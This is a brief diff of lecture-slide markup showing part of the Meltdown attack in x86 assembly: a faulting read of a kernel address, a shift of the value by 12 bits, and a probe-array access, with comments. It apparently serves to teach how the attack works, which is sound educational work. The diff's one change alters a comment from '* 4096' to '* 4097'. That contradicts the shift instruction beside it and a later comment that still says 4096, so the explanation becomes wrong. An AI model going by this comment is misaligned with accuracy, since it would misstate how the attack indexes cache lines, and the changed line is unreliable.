@@ -10,7 +10,7 @@ retry:
     // rax &lt;- memory[kernel address] (segfaults)
     // but check for segfault done out-of-order on Intel at time
     <span data-fragment-index="5" class="fragment custom myem-only">movb (%rcx), %al</span>
-    // rax &lt;- memory[kernel address] * 4096 \[speculated]
+    // rax &lt;- memory[kernel address] * 4097 [speculated]
     <span data-fragment-index="2" class="fragment custom myem-only">shl $0xC, %rax</span>
     <span data-fragment-index="3" class="fragment custom myem-only">jz retry</span>            // not-taken branch
     // access array[memory[kernel address] * 4096]
